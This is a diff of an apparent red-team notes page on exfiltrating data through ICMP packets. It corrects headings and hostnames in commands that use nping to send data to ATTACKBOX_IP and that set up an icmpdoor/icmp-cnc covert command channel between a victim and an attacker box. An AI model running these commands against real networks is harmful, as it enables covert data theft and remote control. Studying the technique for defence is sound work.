@@ -4,7 +4,7 @@
 
 The Internet Control Message Protocol [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol). It is a network layer protocol used to handle error reporting. 
 
-## ICMP Data Section
+### ICMP Data Section
 
 On a high level, the ICMP packet's structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.  
 We can leverage this section in order to exfiltrate datas.  
@@ -56,12 +56,12 @@ v4resk@victime$ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
   
 On the victime machine:
 ```bash
-victime@target$ sudo icmpdoor -i eth0 -d TARGET_IP
+victime@target$ sudo icmpdoor -i eth0 -d ATTACKBOX_IP
 ```
   
-On the target machine:
+On the attacking machine:
 ```bash
-veresk@kali$ sudo icmp-cnc -i eth1 -d ATTACKBOX_IP
+veresk@kali$ sudo icmp-cnc -i eth1 -d VICTIME_IP
 ```
 {% endtab %}
 {% endtabs %}
